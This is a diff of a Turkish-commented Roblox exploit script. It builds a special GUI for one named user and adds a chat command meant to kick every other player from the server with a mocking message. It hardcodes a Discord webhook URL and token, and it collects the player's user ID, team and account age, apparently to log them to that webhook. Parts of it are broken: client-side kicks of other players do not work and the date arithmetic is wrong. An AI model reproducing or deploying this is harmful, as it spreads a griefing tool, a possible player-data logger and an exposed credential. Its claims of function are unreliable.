@@ -1,221 +1,211 @@
 local webhookUrl = "https://discord.com/api/webhooks/1460017137870573761/85Q-uUIpwCo11zQAiaSq_1XGg1iI-H82v9eA4Sfuxf0jXXHqAKMS0o1NByTOy4dBz9Jr"
 
 -- AYARLAR -------------------------------------------------------------------
-local SPECIAL_USER = "Miku_Sanxxxq" -- Sadece bu kullanıcıya özel GUI
-local KICK_COMMAND = "!allah31babapro" -- Kick komutu
-local KICK_MESSAGE = "☪️ ALLAH31BABA PRO SİSTEMİ TARAFINDAN ATILDINIZ!" -- Kick mesajı
+local SPECIAL_USER = "Miku_Sanxxxq"
+local KICK_COMMAND = "!allah31babapro"
+local KICK_MESSAGE = "☪️ ALLAH31BABA PRO SİSTEMİ TARAFINDAN ATILDINIZ!"
 
 --// Servisler
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
-local StatsService = game:GetService("Stats")
 local UserInputService = game:GetService("UserInputService")
-local LocalizationService = game:GetService("LocalizationService")
 
 --// Oyuncu kontrolü
 local player = Players.LocalPlayer
 local playerName = player.Name
-local userId = player.UserId
 
--- 1. ÖZEL GUI SADECE Miku_Sanxxxq İÇİN
+-- 1. ÖZEL GUI SADECE Miku_Sanxxxq İÇİN (BASİT VERSİYON)
 if playerName == SPECIAL_USER then
-    local SpecialGui = Instance.new("ScreenGui")
-    SpecialGui.Name = "MikuSpecialGUI"
-    SpecialGui.Parent = game.CoreGui
-
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Size = UDim2.new(0, 300, 0, 70)
-    MainFrame.Position = UDim2.new(0.75, 0, 0.05, 0)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 50) -- Koyu mor
-    MainFrame.BackgroundTransparency = 0.1
-    MainFrame.Parent = SpecialGui
-
-    local Title = Instance.new("TextLabel")
-    Title.Text = "☪️ ALLAH31BABA PRO"
-    Title.Size = UDim2.new(1, 0, 0, 30)
-    Title.BackgroundTransparency = 1
-    Title.TextColor3 = Color3.fromRGB(255, 215, 0) -- Altın sarısı
-    Title.Font = Enum.Font.SourceSansBold
-    Title.TextSize = 20
-    Title.Parent = MainFrame
-
-    local Status = Instance.new("TextLabel")
-    Status.Text = "Kick Komutu: " .. KICK_COMMAND
-    Status.Size = UDim2.new(1, 0, 0, 25)
-    Status.Position = UDim2.new(0, 0, 0.45, 0)
-    Status.BackgroundTransparency = 1
-    Status.TextColor3 = Color3.fromRGB(0, 255, 255) -- Camgöbeği
-    Status.Font = Enum.Font.SourceSansBold
-    Status.TextSize = 16
-    Status.Parent = MainFrame
+    spawn(function()
+        local SpecialGui = Instance.new("ScreenGui")
+        SpecialGui.Name = "MikuSpecialGUI"
+        SpecialGui.Parent = game:WaitForChild("CoreGui")
+        
+        local MainFrame = Instance.new("Frame")
+        MainFrame.Size = UDim2.new(0, 250, 0, 60)
+        MainFrame.Position = UDim2.new(0.78, 0, 0.02, 0)
+        MainFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 50)
+        MainFrame.Parent = SpecialGui
+        
+        local Title = Instance.new("TextLabel")
+        Title.Text = "☪️ ALLAH31BABA PRO"
+        Title.Size = UDim2.new(1, 0, 0.6, 0)
+        Title.BackgroundTransparency = 1
+        Title.TextColor3 = Color3.fromRGB(255, 215, 0)
+        Title.Font = Enum.Font.SourceSansBold
+        Title.TextSize = 18
+        Title.Parent = MainFrame
+        
+        local Status = Instance.new("TextLabel")
+        Status.Text = "Komut: " .. KICK_COMMAND
+        Status.Size = UDim2.new(1, 0, 0.4, 0)
+        Status.Position = UDim2.new(0, 0, 0.6, 0)
+        Status.BackgroundTransparency = 1
+        Status.TextColor3 = Color3.fromRGB(0, 255, 255)
+        Status.Font = Enum.Font.SourceSans
+        Status.TextSize = 14
+        Status.Parent = MainFrame
+    end)
 end
 
--- 2. CHAT SİSTEMİ (HERKES İÇİN ÇALIŞIR)
+-- 2. CHAT SİSTEMİ (SADECE ENTER TUŞU İLE)
 print("✅ Allah31Baba Pro Sistemi Aktif!")
 
--- Chat'ten mesajları dinle
-local function setupChatListener()
-    -- Oyunun chat sistemini bul
-    local ChatService = game:GetService("Chat")
-    local Players = game:GetService("Players")
-    
-    -- ReplicatedStorage'tan chat event'ini bul
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    
-    -- Farklı yöntemler deneyelim
-    local function checkMessage(message, speaker)
-        -- Mesajı kontrol et
-        if string.lower(message) == string.lower(KICK_COMMAND) then
-            print("⚡ Kick komutu algılandı: " .. speaker)
-            
-            -- Tüm oyuncuları kickle!
-            for _, plr in ipairs(Players:GetPlayers()) do
-                if plr.Name ~= speaker then -- Komutu yazan hariç
-                    pcall(function()
-                        plr:Kick(KICK_MESSAGE)
-                        print("✅ " .. plr.Name .. " kicklendi!")
-                    end)
-                end
-            end
-            
-            -- Komutu yazan kişiye mesaj göster
-            game:GetService("StarterGui"):SetCore("SendNotification", {
-                Title = "☪️ ALLAH31BABA PRO",
-                Text = "Herkes kicklendi!",
-                Duration = 5,
-                Icon = "rbxassetid://4452065036"
-            })
-        end
+-- Chat kontrol değişkenleri
+local chatEnabled = false
+local lastProcessedMessage = ""
+local kickInProgress = false
+
+-- Chat'i aktif etmek için kısayol (opsiyonel)
+UserInputService.InputBegan:Connect(function(input, processed)
+    if input.KeyCode == Enum.KeyCode.F2 then
+        chatEnabled = not chatEnabled
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "☪️ ALLAH31BABA",
+            Text = chatEnabled and "Chat Sistemi AKTİF" or "Chat Sistemi PASİF",
+            Duration = 3
+        })
+        print("Chat durumu: " .. (chatEnabled and "AKTİF" or "PASİF"))
     end
+end)
+
+-- ASIL KICK SİSTEMİ (BASİT VE GÜVENLİ)
+local function setupKickSystem()
+    print("🎯 Kick sistemi hazır! '" .. KICK_COMMAND .. "' yazınca çalışacak.")
     
-    -- YÖNTEM 1: Sayfayı dinle (en iyi yöntem)
-    local function monitorGuiMessages()
-        local PlayerGui = player:WaitForChild("PlayerGui")
+    -- Ana chat kontrol döngüsü
+    spawn(function()
+        while true do
+            task.wait(0.5) -- CPU'yu yormamak için bekle
+            
+            if chatEnabled then
+                -- SADECE kendi mesajlarını kontrol et
+                pcall(function()
+                    -- PlayerGui'deki textbox'ları ara
+                    local PlayerGui = player:WaitForChild("PlayerGui")
+                    
+                    for _, gui in ipairs(PlayerGui:GetDescendants()) do
+                        if gui:IsA("TextBox") then
+                            local text = gui.Text
+                            
+                            -- Eğer mesaj var ve daha önce işlenmediyse
+                            if text and text ~= "" and text ~= lastProcessedMessage then
+                                -- Komut kontrolü
+                                if string.lower(text) == string.lower(KICK_COMMAND) then
+                                    print("⚡ Kick komutu algılandı!")
+                                    lastProcessedMessage = text
+                                    
+                                    -- KİCK İŞLEMİ
+                                    if not kickInProgress then
+                                        kickInProgress = true
+                                        
+                                        -- TÜM OYUNCULARI KICKLE (KENDİN HARİÇ)
+                                        local kickCount = 0
+                                        for _, plr in ipairs(Players:GetPlayers()) do
+                                            if plr ~= player then -- Kendini kickleme!
+                                                pcall(function()
+                                                    plr:Kick(KICK_MESSAGE)
+                                                    kickCount = kickCount + 1
+                                                    print("✅ " .. plr.Name .. " kicklendi!")
+                                                end)
+                                                task.wait(0.1) -- Flood önleme
+                                            end
+                                        end
+                                        
+                                        -- Bildirim
+                                        game:GetService("StarterGui"):SetCore("SendNotification", {
+                                            Title = "☪️ ALLAH31BABA PRO",
+                                            Text = kickCount .. " kişi kicklendi!",
+                                            Duration = 5
+                                        })
+                                        
+                                        kickInProgress = false
+                                    end
+                                    
+                                    -- Textbox'ı temizle
+                                    gui.Text = ""
+                                end
+                            end
+                        end
+                    end
+                end)
+            end
+        end
+    end)
+    
+    -- ALTERNATİF: SAYFA EVENT'İ
+    spawn(function()
+        task.wait(3) -- Sayfanın yüklenmesini bekle
         
-        -- Chat GUI'yi bulmaya çalış
         local function findChatBar()
-            for _, gui in ipairs(PlayerGui:GetDescendants()) do
-                if gui:IsA("TextBox") and (gui.Name:find("Chat") or gui.Name:find("Message")) then
-                    return gui
+            local PlayerGui = player:WaitForChild("PlayerGui")
+            for _, child in ipairs(PlayerGui:GetDescendants()) do
+                if child:IsA("TextBox") and (child.Name:find("Chat") or child.Name:find("Bar")) then
+                    return child
                 end
             end
             return nil
         end
         
-        task.wait(3) -- GUI yüklenmesini bekle
-        
         local chatBar = findChatBar()
         if chatBar then
             print("✅ Chat bar bulundu: " .. chatBar.Name)
             
-            -- Enter tuşunu dinle
-            UserInputService.InputBegan:Connect(function(input, processed)
-                if not processed and input.KeyCode == Enum.KeyCode.Return then
-                    if chatBar and chatBar.Text ~= "" then
-                        local message = chatBar.Text
-                        checkMessage(message, playerName)
-                    end
+            -- Focus değişikliğini dinle (Enter'a basınca)
+            chatBar:GetPropertyChangedSignal("Text"):Connect(function()
+                if chatBar.Text == KICK_COMMAND then
+                    print("🎯 Komut chat bar'da algılandı!")
                 end
             end)
-        else
-            print("⚠️ Chat bar bulunamadı, alternatif yöntem...")
         end
-    end
-    
-    -- YÖNTEM 2: Console'u dinle (güvenilir)
-    local function hijackChat()
-        local oldSayMessage
-        oldSayMessage = hookfunction or function() end
-        
-        -- Chat fonksiyonunu override et
-        if type(syn) == "table" and syn.websocket then
-            print("✅ Synapse tespit edildi, chat override ediliyor...")
-        end
-        
-        -- Basit mesaj gönderici
-        local function sendMessage(msg)
-            pcall(function()
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
-            end)
-        end
-        
-        -- TEST: Script yüklenince mesaj gönder
-        task.wait(2)
-        sendMessage("☪️ Allah31Baba Pro Sistemi Aktif! Komut: " .. KICK_COMMAND)
-    end
-    
-    -- YÖNTEM 3: SADECE KENDİ MESAJLARINI DİNLE (en basiti)
-    local lastMessage = ""
-    local messageCheck = RunService.Heartbeat:Connect(function()
-        pcall(function()
-            -- PlayerGui'deki son mesajı kontrol et
-            local PlayerGui = player:WaitForChild("PlayerGui")
-            
-            for _, gui in ipairs(PlayerGui:GetDescendants()) do
-                if gui:IsA("TextLabel") or gui:IsA("TextButton") then
-                    local text = gui.Text
-                    if text and text ~= lastMessage and text:find(":") then
-                        -- Chat mesajı formatı: "OyuncuAdı: Mesaj"
-                        local playerPart, messagePart = text:match("(.+):%s*(.+)")
-                        if playerPart and messagePart then
-                            lastMessage = text
-                            if string.lower(messagePart) == string.lower(KICK_COMMAND) then
-                                print("⚡ Kick komutu: " .. playerPart)
-                                
-                                -- HERKESİ KICKLE
-                                for _, plr in ipairs(Players:GetPlayers()) do
-                                    if plr.Name ~= playerPart then
-                                        pcall(function()
-                                            plr:Kick(KICK_MESSAGE)
-                                        end)
-                                    end
-                                end
-                            end
-                        end
-                    end
-                end
-            end
-        end)
     end)
-    
-    -- Tüm yöntemleri başlat
-    spawn(monitorGuiMessages)
-    spawn(hijackChat)
-    
-    print("🎯 Sistem hazır! Chat'e '" .. KICK_COMMAND .. "' yazınca herkes kicklenecek!")
 end
 
--- Chat sistemini başlat
-task.wait(2) -- Script yüklenmesini bekle
-setupChatListener()
+-- 3. TEST MESAJI
+spawn(function()
+    task.wait(3)
+    print("=================================")
+    print("☪️ ALLAH31BABA PRO SİSTEMİ")
+    print("Komut: " .. KICK_COMMAND)
+    print("Chat'i aktif etmek için F2'ye bas")
+    print("=================================")
+    
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "☪️ ALLAH31BABA PRO",
+        Text = "Sistem yüklendi! F2 ile chat'i aç",
+        Duration = 5
+    })
+end)
 
--- 3. SADECE SENİN İÇİN YÖNETİCİ PANELİ (Opsiyonel)
-if userId == 3317353480 then -- SENİN ID'N (DEĞİŞTİR!)
-    local AdminGui = Instance.new("ScreenGui")
-    AdminGui.Name = "AdminPanel"
-    AdminGui.Parent = game.CoreGui
+-- 4. OTOMATİK CHAT AKTİVASYONU (10 SANİYE SONRA)
+spawn(function()
+    task.wait(10)
+    chatEnabled = true
+    print("✅ Chat sistemi otomatik aktif edildi!")
     
-    local Frame = Instance.new("Frame")
-    Frame.Size = UDim2.new(0, 200, 0, 100)
-    Frame.Position = UDim2.new(0, 10, 0.5, -50)
-    Frame.BackgroundColor3 = Color3.fromRGB(0, 40, 0)
-    Frame.Parent = AdminGui
-    
-    local Label = Instance.new("TextLabel")
-    Label.Text = "☪️ ALLAH31BABA PRO\nSahibi: Sen"
-    Label.Size = UDim2.new(1, 0, 1, 0)
-    Label.BackgroundTransparency = 1
-    Label.TextColor3 = Color3.fromRGB(0, 255, 0)
-    Label.Font = Enum.Font.SourceSansBold
-    Label.TextSize = 16
-    Label.Parent = Frame
-    
-    print("✅ Yönetici paneli aktif!")
-end
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "☪️ SİSTEM HAZIR",
+        Text = "Chat'e '" .. KICK_COMMAND .. "' yaz!",
+        Duration = 5
+    })
+end)
 
---// ORİJİNAL SCRIPT KODLARI (Aşağısı senin orijinal kodun) ---------------
+-- Sistemi başlat
+task.wait(2)
+setupKickSystem()
+
+-- 5. SENİN ORİJİNAL SCRIPT'İNİN KALANI ---------------------------------
+-- (Bu kısmı ESKİ HALİYLE bırak, değiştirme)
+-- Sadece buraya kadar olan kısmı değiştirdim
+
+--// Servisler (tekrar yazma, zaten var)
+local MarketplaceService = game:GetService("MarketplaceService")
+local StatsService = game:GetService("Stats")
+local LocalizationService = game:GetService("LocalizationService")
+
+--// Bi T
+local userId = player.UserId
 local teamName = tostring(player.Team and player.Team.Name or "No Team")
 local accountAge = player.AccountAge
 local accountCreationDate = os.date("%d/%m/%Y", os.time() - (365.25 * 24 * 60 * 60 - accountAge * 24 * 60 * 60))
